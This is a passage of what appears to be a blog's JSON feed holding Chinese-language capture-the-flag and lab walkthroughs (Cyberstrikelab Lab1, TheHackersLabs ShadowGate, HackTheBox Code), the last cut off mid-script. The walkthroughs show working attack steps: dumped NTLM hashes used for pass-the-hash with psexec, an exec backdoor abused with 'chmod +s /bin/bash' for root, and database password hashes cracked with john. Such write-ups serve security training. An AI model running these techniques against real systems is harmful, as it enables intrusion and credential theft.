hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::\ncyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::\nWIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:f056ff4d1ad036e570c5344bb3d4e65c:::\nCYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:c9f108dc7ba78e084283c00e33dffeff:::\n```\n\n## 192.168.20.20\n\næµ‹è¯•å‡­æ®\n\n```php\nâœ  Lab1 proxychains -q nxc smb 192.168.20.20 -u administrator -H 94bd5248e87cb7f2f9b871d40c903927 \nSMB         192.168.20.20   445    CYBERWEB         [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True) \nSMB         192.168.20.20   445    CYBERWEB         [+] cyberstrikelab.com\\administrator:94bd5248e87cb7f2f9b871d40c903927 (Pwn3d!)\n```\n\n`PTH` æ‹¿ä¸‹\n\n```php\nâœ  Lab1 proxychains -q psexec.py cyberstrikelab.com/administrator@cyberweb.cyberstrikelab.com -hashes aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on cyberweb.cyberstrikelab.com.....\n[*] Found writable share ADMIN$\n[*] Uploading file pqpIKIBX.exe\n[*] Opening SVCManager on cyberweb.cyberstrikelab.com.....\n[*] Creating service WhKD on cyberweb.cyberstrikelab.com.....\n[*] Starting service WhKD.....\n[!] Press help for extra shell commands\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\nMicrosoft Windows [ï¿½æ±¾ 6.3.9600]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py again with -codec and the corresponding codec\n(c) 2013 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½\n\nC:\\Windows\\system32>\n```\n\nè¯»å–ç¬¬ä¸‰ä¸ª `flag`\n\n```php\nC:\\> type flag.txt\ngo-flag{Nb8VOT8X9SbIzyDI}\n```",
            "url": "https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab-1",
            "title": "Cyberstrikelab - Lab1",
            "summary": "Lab 1 https://www.cyberstrikelab.com/#/scene/detail/20 Youcms youcms ç½‘ä¸Šèƒ½æ‰¾åˆ° youcms å‰å° getshell çš„åˆ©ç”¨ https://blog.csdn.net/qq 48985780/article/details/12...",
            "date_modified": "2025-08-12T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "Cyberstrikelab",
                "Windows",
                "Vshell",
                "å¤šå±‚å†…ç½‘",
                "MS17_010"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/06/TheHackersLabsShadowGate",
            "content_html": "\n# ShadowGate\n\n> https://labs.thehackerslabs.com/machine/97\n> \n\n![image.png](/post-images/TheHackersLabsShadowGate/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  ShadowGate nmap -sT -min-rate 10000 -p- 192.168.56.105\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:20 CST\nNmap scan report for 192.168.56.105\nHost is up (0.00050s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n22/tcp    open  ssh\n8080/tcp  open  http-proxy\n56789/tcp open  unknown\nMAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 16.41 seconds\n```\n\n```bash\nâœ  ShadowGate nmap -sT -A -p 22,8080,56789 192.168.56.105\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:21 CST\nNmap scan report for 192.168.56.105\nHost is up (0.00047s latency).\n\nPORT      STATE SERVICE    VERSION\n22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 84:05:fe:ed:47:16:ab:28:70:0f:44:6e:f6:8d:0c:6f (ECDSA)\n|_  256 99:a9:88:76:ee:c8:ed:ce:73:57:2a:22:da:9f:7b:7e (ED25519)\n8080/tcp  open  http       Werkzeug httpd 3.1.3 (Python 3.12.3)\n|_http-title: 403 Forbidden\n|_http-server-header: Werkzeug/3.1.3 Python/3.12.3\n56789/tcp open  tcpwrapped\nMAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.47 ms 192.168.56.105\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.07 seconds\n```\n\n### æšä¸¾\n\n `8080` ç«¯å£\n\næç¤ºé”™è¯¯çš„æ–¹æ³•ï¼Œä½†æ˜¯ä½ æ‰¾åˆ°è·¯å¾„äº†\n\n![Snipaste_2025-08-05_21-30-52.png](/post-images/TheHackersLabsShadowGate/Snipaste_2025-08-05_21-30-52.png)\n\næ”¹ä¸º `POST` æ–¹æ³•åæç¤º\n\n![image.png](/post-images/TheHackersLabsShadowGate/image1.png)\n\næ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼Œçœ‹ä¸€ä¸‹å…¶ä»–ç«¯å£\n\nå¥‡æ€ªçš„ `56789` ç«¯å£ï¼Œ`nc` è¯•ä¸€ä¸‹\n\n```bash\nâœ  ShadowGate nc 192.168.56.105 56789                 \nShadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closelyâ€”patterns hide in the noise. Sequence always matters.\nListening... but no response.\n```\n\n> æš—å½±ä¹‹é—¨ v1.0 :: å¹¶éæ‰€æœ‰é—¨éƒ½é”ç€ã€‚æœ‰äº›é—¨åœ¨ç­‰å¾…å¤œå¹•é™ä¸´ã€‚ä»”ç»†è†å¬â€”â€”å™ªéŸ³ä¸­éšè—ç€è§„å¾‹ã€‚é¡ºåºæ€»æ˜¯å¾ˆé‡è¦ã€‚\nè†å¬â€¦â€¦ä½†æ²¡æœ‰å›åº”ã€‚\n> \n\nçœ‹ç€åƒæ˜¯è¦å‘é‡Œè¾¹æŒ‰é¡ºåºè¾“å…¥ä¸€ä¸‹ä¸œè¥¿\n\n## 56789\n\nå½“æˆ‘ä»¬è¾“å…¥ `n0cturne` æ—¶ï¼Œä¼šå‡ºç°å¥½å‡ ä¸² `base64` åŠ å¯†åçš„å­—ç¬¦\n\n![image.png](/post-images/TheHackersLabsShadowGate/image2.png)\n\nå¹¶ä¸”é‡æ–°è¾“å…¥ç”Ÿæˆçš„è¿˜æ˜¯ä¸ä¸€æ ·çš„\n\n![image.png](/post-images/TheHackersLabsShadowGate/image3.png)\n\næ ¹æ®ç‰¹å¾ï¼Œè§£å¯†åå¾—åˆ° 16å­—èŠ‚ = 128ä½ã€‚è¿™æ˜¯ç°ä»£åˆ†ç»„å¯†ç ï¼ˆå¦‚ `AES-128`ï¼‰æœ€å¸¸è§çš„å—å¤§å°ï¼ˆBlock Sizeï¼‰\n\n```bash\n// ç¬¬ä¸€æ¬¡ç”Ÿæˆ\nYzRmN2QzNQ==\nMwaB7TbchXxNQQwID9JXIg==\n7+ptCEtXTcCFo8dVwYrIEw==\nYAgEH6bP+PPY4VyD80z7sg==\na+T5dxugIDfFykgQi71Eag==\nfGMHS36e74T+cALZURlj8g==\nez4fog9UnAeemGETp6K2Aw==\nXZSJq2YIk3v/GM9R/NPa9w==\nsh6KfrTKDXndFadgySlIhA==\n\n// ç¬¬äºŒæ¬¡ç”Ÿæˆ\nYzRmN2QzNQ==\n5/moJpOc9OpfYOHR6jl+bA==\nGWxuKkuzPn0t4aTSO0livQ==\nE2QIRlxnY+gWfTlVUcm4LA==\nYu9ChnO4fJxbMPPGbN04ug==\nNdNO8rDcGcLah47kqmnKBA==\ngFpBAQKKx1QDMNw60GkiwA==\n4eL9754ZX/qQYUk4s6Q9SA==\nMxte5TYR9OIZuzOmQDWAYg==\n```\n\nç¬¬ä¸€è¡Œè§£ç ä¸ºï¼š`YzRmN2QzNQ==` >`c4f7d35`\n\nè¿™é‡Œå› ä¸ºæˆ‘å¯¹å¯†ç å­¦ä¸ç†Ÿï¼ŒæŸ¥é˜…äº†ä¸€ä¸‹ `WP`\n\nç¬¬ä¸€ä¸²ç¼–ç åº”è¯¥æ˜¯å¯†é’¥\n\n```bash\n(more) âœ  ShadowGate echo -n \"c4f7d35\" | sha256sum\n7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -\n```\n\nç„¶ååœ¨ `cyberchef` è¿›è¡Œè§£å¯†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ `IV` ä»¥åŠåŠ å¯†æ¨¡å¼ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥è¿›è¡Œæµ‹è¯•ä¸€ä¸‹ï¼Œæœ€åå¯ä»¥ä½¿ç”¨ `ECB/NoPadding` è¿›è¡Œè§£å¯†\n\nè§£å¯†ç¬¬ä¸€æ¬¡çš„å¯†æ–‡\n\n![image.png](/post-images/TheHackersLabsShadowGate/image4.png)\n\nè§£å¯†ç¬¬äºŒæ¬¡çš„å¯†æ–‡\n\n![image.png](/post-images/TheHackersLabsShadowGate/image5.png)\n\nå¯ä»¥å‘ç°æ¯ä¸€æ®µå¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯ä¸€æ ·çš„ï¼Œèƒ½æ‹¿åˆ° `v4u1tgx9`\n\n## 8080\n\næ‹¿åˆ° `v4u1tgx9` ä¹‹åï¼Œæˆ‘ä»¬åº”è¯¥å¯ä»¥å¯¹ `8080` è¿›è¡Œæµ‹è¯•äº†\n\nè¾“å…¥ `username`\n\n![image.png](/post-images/TheHackersLabsShadowGate/image6.png)\n\n> ä»¤ç‰Œå·²æ´¾å‡ºã€‚ä½ åªéœ€è¦â€¦â€¦ä¾§èº«çœ‹ã€‚\n> \n\næç¤ºç¼ºå°‘ `Token` ï¼Œå¹¶ä¸”è¿˜çœ‹åˆ°ç›¸åº”ä¿ä¸­å¸¦æœ‰ `MFA`ï¼ˆåŒé‡è®¤è¯ï¼‰ï¼Œæ˜¯åŸºäºæ—¶é—´ç”Ÿæˆçš„ `TOTP` ä¸€æ¬¡æ€§å£ä»¤ï¼Œæ— æ³•ç›´æ¥çˆ†ç ´\n\nå¯¹ç›®å½•è¿›è¡Œçˆ†ç ´ï¼Œå°è¯•å¯»æ‰¾æ›´å¤šæ¥å£\n\n```bash\nâœ  ShadowGate ffuf -u 'http://192.168.56.105:8080/FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fc 404,403 -X POST -H 'Content-Type: application/x-www-form-urlencoded'\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : POST\n :: URL              : http://192.168.56.105:8080/FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 404,403\n________________________________________________\n\nlogin                   [Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 72ms]\nverify                  [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 85ms]\n```\n\næ‰¾åˆ° `verify` çš„ç«¯ç‚¹ï¼Œè¿›è¡Œæµ‹è¯•ï¼Œæ‰€ä»¥ `login`æ˜¯ç¬¬ä¸€å±‚è®¤è¯ï¼Œ`verify` æ˜¯ç¬¬äºŒå±‚è®¤è¯\n\nå°†ç¬¬ä¸€å±‚çš„å“åº”ä¸­çš„ `X-Shadow-MFA: 286346` æ”¾åˆ° `verify`ä¸­\n\n![image.png](/post-images/TheHackersLabsShadowGate/image7.png)\n\næ·»åŠ åæç¤ºï¼šâ€ æ‰¿è®¤ã€‚ä¸»åŠ¨æœåŠ¡ã€‚â€œ\n\n![image.png](/post-images/TheHackersLabsShadowGate/image8.png)\n\nå›åˆ° `56789`ç«¯å£ï¼ŒåŸæœ¬çš„è¡Œä¸ºä¼šè¢«æ”¹å˜\n\n![image.png](/post-images/TheHackersLabsShadowGate/image9.png)\n\nå¾—åˆ°ä¸€ç»„å‡­æ® `mars:sshpassword123`\n\nè¯¥ç”¨æˆ·èƒ½è¯»å– `user.txt`\n\n```bash\nmars@TheHackersLabs-Shadowgate:~$ cat user.txt \nacf9xxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æƒé™æå‡\n\næŸ¥çœ‹æ­£åœ¨ç›‘å¬ç«¯å£\n\nå­˜åœ¨ä¸€ä¸ªæœ¬åœ°æ‰“å¼€ `4444` ç«¯å£\n\n```bash\nmars@TheHackersLabs-Shadowgate:~$ ss -tulpn\nNetid          State           Recv-Q          Send-Q                             Local Address:Port                      Peer Address:Port          Process                                    \nudp            UNCONN          0               0                                     127.0.0.54:53                             0.0.0.0:*                                                        \nudp            UNCONN          0               0                                  127.0.0.53%lo:53                             0.0.0.0:*                                                        \nudp            UNCONN          0               0                          192.168.56.105%enp0s3:68                             0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                      127.0.0.1:4444                           0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                        0.0.0.0:2222                           0.0.0.0:*              users:((\"socat\",pid=25904,fd=5))          \ntcp            LISTEN          0               4096                               127.0.0.53%lo:53                             0.0.0.0:*                                                        \ntcp            LISTEN          0               5                                        0.0.0.0:56789                          0.0.0.0:*                                                        \ntcp            LISTEN          0               4096                                  127.0.0.54:53                             0.0.0.0:*                                                        \ntcp            LISTEN          0               128                                      0.0.0.0:8080                           0.0.0.0:*                                                        \ntcp            LISTEN          0               4096                                           *:22                                   *:* \n```\n\nä½¿ç”¨ `socat` è½¬å‘å‡ºæ¥\n\n```bash\nmars@TheHackersLabs-Shadowgate:~$ ./socat TCP-LISTEN:2222,fork TCP4:127.0.0.1:4444 &\n```\n\nè¿›è¡Œäº¤äº’\n\n![image.png](/post-images/TheHackersLabsShadowGate/image10.png)\n\næµ‹è¯•äº†ä¸€ä¸‹æœ‰ç‚¹æ‡µ\n\nåœ¨ `/opt` ä¸­èƒ½æ‰¾åˆ°æºç \n\n```bash\nmars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ cat shadow-client.py\n#!/usr/bin/env python3\nimport socket\nimport threading\nimport io\nimport contextlib\n\ndef handle_client(client_socket):\n    client_socket.send(b\"Welcome to Shadow Client Helper\\n\")\n    client_socket.send(b\"This is an unrestricted environment. Good luck, hacker.\\n\")\n    while True:\n        client_socket.send(b\">>> \")\n        code = client_socket.recv(1024).decode().strip()\n        try:\n            output = io.StringIO()\n            with contextlib.redirect_stdout(output):\n                exec(code, globals())\n            result = output.getvalue()\n            if result.strip():\n                client_socket.send(result.encode())\n        except Exception as e:\n            client_socket.send(f\"Error: {e}\\n\".encode())\n\ndef main():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind((\"127.0.0.1\", 4444))\n    server.listen(5)\n    while True:\n        client, addr = server.accept()\n        client_handler = threading.Thread(target=handle_client, args=(client,))\n        client_handler.start()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nç®€å•æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªæœåŠ¡å™¨ï¼Œä»»ä½•è¿æ¥åˆ°è¿™ä¸ªæœåŠ¡å™¨çš„å®¢æˆ·ç«¯éƒ½å¯ä»¥æ‰§è¡Œä»»æ„çš„ Python ä»£ç ï¼Œå¹¶è·å–æ‰§è¡Œç»“æœã€‚ è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCE, Remote Code Executionï¼‰çš„åé—¨ç¨‹åºã€‚\n\nè¿™å°±ç®€å•äº†ï¼Œè¾“å…¥\n\n```bash\n>>> import os;\n>>> os.system(\"chmod +s /bin/bash\")\n```\n\nå›åˆ°é¶æœºä¸ŠæŸ¥çœ‹\n\n![image.png](/post-images/TheHackersLabsShadowGate/image11.png)\n\nè¯»å– `root.txt`\n\n```bash\nmars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ /bin/bash -p\nbash-5.2# cd /root\nbash-5.2# cat root.txt\n437axxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/08/06/TheHackersLabsShadowGate",
            "title": "TheHackersLabs - ShadowGate",
            "summary": "ShadowGate https://labs.thehackerslabs.com/machine/97 Recon PortScan æšä¸¾ 8080 ç«¯å£ æç¤ºé”™è¯¯çš„æ–¹æ³•ï¼Œä½†æ˜¯ä½ æ‰¾åˆ°è·¯å¾„äº† æ”¹ä¸º POST æ–¹æ³•åæç¤º æ²¡æœ‰ä»»ä½•ä¿¡æ¯ï¼Œçœ‹ä¸€ä¸‹å…¶ä»–ç«¯å£ å¥‡æ€ªçš„ 56789 ç«¯å£ï¼Œnc è¯•ä¸€ä¸‹ æš—å½±ä¹‹é—¨...",
            "date_modified": "2025-08-06T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "MFA",
                "ffuf",
                "Python"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/06/HackTheBoxSeason7-Code",
            "content_html": "# Season7-Code\n\n> https://app.hackthebox.com/machines/653 | `esay`\n> \n\n## å‰æœŸè¸©ç‚¹\n\n```bash\nâš¡ root@kali î‚° ~ î‚° nmap -sT -min-rate 10000 -p- 10.10.11.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:09 EDT\nNmap scan report for 10.10.11.62\nHost is up (0.15s latency).\nNot shown: 64591 filtered tcp ports (no-response), 943 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap done: 1 IP address (1 host up) scanned in 37.29 seconds\n```\n\nå°±æ‰«æå‡ºä¸€ä¸ª`22`ç«¯å£ï¼Œä¸å¯¹åŠ²ç»§ç»­æ‰«\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/Code î‚° nmap -sS -min-rate 10000 -p- 10.10.11.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:34 EDT\nWarning: 10.10.11.62 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.11.62\nHost is up (0.84s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5000/tcp open  upnp\n\nNmap done: 1 IP address (1 host up) scanned in 33.23 seconds\n```\n\næ–°ç«¯å£æ˜¯ä¸€ä¸ªä»£ç ç¼–è¾‘å™¨`Python Code Editor`\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/Code î‚° nmap -sT -A -T4 -O -p 22,5000 10.10.11.62     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:30 EDT\nNmap scan report for 10.10.11.62\nHost is up (0.20s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)\n|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)\n|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)\n5000/tcp open  http    Gunicorn 20.0.4\n|_http-title: Python Code Editor\n|_http-server-header: gunicorn/20.0.4\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   204.69 ms 10.10.16.1\n2   156.61 ms 10.10.11.62\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 34.11 seconds\n```\n\n## WEB æ¸—é€\n\nå¯ä»¥æ‰§è¡Œpythonå‘½ä»¤ï¼Œé¦–å…ˆå°è¯•ä¸€ä¸‹`os` åº“\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image56.png)\n\næç¤º`Use of restricted keywords is not allowed.` ç»è¿‡æµ‹è¯•æ˜¯å°†`import` ã€`os` ç­‰å…³é”®å­—ç»™è¿‡æ»¤äº†\n\nå³è¾¹å¯ä»¥åˆ›å»ºè´¦æˆ·ï¼Œè¿™é‡Œåˆ›å»ºäº†ç”¨æˆ·`sunset`\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image57.png)\n\nå¯ä»¥çœ‹åˆ°å­˜åœ¨`MyCodes` ï¼Œæˆ‘ä»¬å°†ä»£ç ä¿å­˜ä¸º`test`è¯•è¯•\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image58.png)\n\nå°è¯•ä¸€ä¸‹è¯­æ³•æ³¨å…¥\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image59.png)\n\nå¯ä»¥æˆåŠŸå›æ˜¾ï¼Œå†å°è¯•ä¸€ä¸‹ä½¿ç”¨æ¨¡æ¿è¯­æ³•\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image60.png)\n\nä¹Ÿæ˜¯æˆåŠŸå›æ˜¾äº†ï¼Œé‚£ä¹ˆè¯¥åº”ç”¨æ˜¯ä½¿ç”¨`Flask`æ­å»ºçš„`Web`åº”ç”¨\n\nä½¿ç”¨`SSTImap`å°è¯•æ¨¡æ¿æ³¨å…¥\n\n```bash\npython sstimap.py -u http://10.10.11.62:5000/run_code -H 'application/x-www-form-urlencoded; charset=UTF-8' -m 'POST' -d 'code=print(render_template_string(\"{{*}}\"))'\n```\n\nç»“æœå°±æ˜¯æ²¡åŠæ³•åˆ©ç”¨ï¼Œä½†æ˜¯çŸ¥é“äº†å­˜åœ¨`jinja2`\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image61.png)\n\nå› ä¸ºå­˜åœ¨ç™»é™†æ“ä½œï¼Œæ‰€ä»¥å¯èƒ½å¯ä»¥è¿›è¡Œæ“ä½œæ•°æ®åº“ï¼Œå°è¯•ä¸€ä¸‹æ•°æ®åº“è¯­æ³•\n\n![image.png](/post-images/HackTheBoxSeason7-Code/image62.png)\n\næœ‰å›æ˜¾ï¼Œé€šè¿‡`GPT`è¿›è¡Œæ„é€ \n\n```bash\ncode=print([user.username for user in User.query.all()])\n// output\n{\"output\":\"['development', 'martin', 'test']\\n\"}\n```\n\n```bash\n\ncode=print([user.password for user in User.query.all()])\n// output\n{\"output\":\"['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be', '098f6bcd4621d373cade4e832627b4f6']\\n\"}\n```\n\nå¾—åˆ°ä¸¤ç»„ç”¨æˆ·åå¯†ç `development:759b74ce43947f5f4c91aeddc3e5bad3` å’Œ`martin:3de6f30c4a09c27fc71932bfc68474be`\n\nå°†å¯†ç ä¿å­˜åˆ°`pass.txt`ä½¿ç”¨`John`ç ´è§£\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/Code î‚° john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 pass.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support for this hash type, consider --fork=16\nPress 'q' or Ctrl-C to abort, almost any other key for status\ndevelopment      (?)     \nnafeelswordsmaster (?)     \n2g 0:00:00:00 DONE (2025-03-25 00:26) 3.333g/s 8711Kp/s 8711Kc/s 9050KC/s nafi79..naerulz\nUse the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliably\nSession completed. \n```\n\n```bash\ndevelopment:development\nmartin:nafeelswordsmaster\n```\n\nå¾—åˆ°ä¸¤ä¸ªè´¦æˆ·ï¼Œç›´æ¥å°è¯•`SSH` \n\næœ€åä½¿ç”¨`martin`æˆåŠŸç™»å½•\n\n```bash\nâš¡ root@kali î‚° ~/Desktop/test/Code î‚° ssh martin@10.10.11.62\nmartin@10.10.11.62's password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Tue 25 Mar 2025 04:10:56 AM UTC\n\n  System load:           0.3\n  Usage of /:            51.4% of 5.33GB\n  Memory usage:          14%\n  Swap usage:            0%\n  Processes:             234\n  Users logged in:       1\n  IPv4 address for eth0: 10.10.11.62\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:c80e\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nLast login: Tue Mar 25 04:10:56 2025 from 10.10.16.7\nmartin@code:~$ \n```\n\n## Get Flag\n\nä¿¡æ¯æ”¶é›†ä¸€æ³¢\n\n```bash\nmartin@code:~$ uname -a\nLinux code 5.4.0-208-generic #228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n```\n\n```bash\nmartin@code:~$ ip add\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:b9:c8:0e brd ff:ff:ff:ff:ff:ff\n    inet 10.10.11.62/23 brd 10.10.11.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 dead:beef::250:56ff:feb9:c80e/64 scope global dynamic mngtmpaddr \n       valid_lft 86399sec preferred_lft 14399sec\n    inet6 fe80::250:56ff:feb9:c80e/64 scope link \n       valid_lft forever preferred_lft forever\n```\n\n```bash\nmartin@code:~$ sudo -l\nMatching Defaults entries for martin on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser martin may run the following commands on localhost:\n    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh\n```\n\næŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å¯ä»¥ä»¥`Root`æƒé™è¿è¡Œçš„è„šæœ¬\n\n```bash\nmartin@code:~/backups/home/app-production/app$ cat /usr/bin/backy.sh\n#!/bin/bash\n\nif [[ $# -ne 1 ]]; then\n    /usr/bin/echo \"Usage: $0 <task.json>\"\n    exit 1\nfi\n\njson_file=\"$1\"\n\nif [[ ! -f \"$json_file\" ]]; then\n    /usr/bin/echo \"Error: File '$json_file' not found.\"\n    exit 1\nfi\n\nallowed_paths=(\"/var/\" \"/home/\")\n\nupdated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub(\"\\\\.\\\\./\"; \"\"))' \"$json_file\")\n\n/usr/bin/echo \"$updated_json\" > \"$json_file\"\n\ndirectories_to_archive=$(/usr/bin/echo \"$updated_json\" | /usr/bin/jq -r 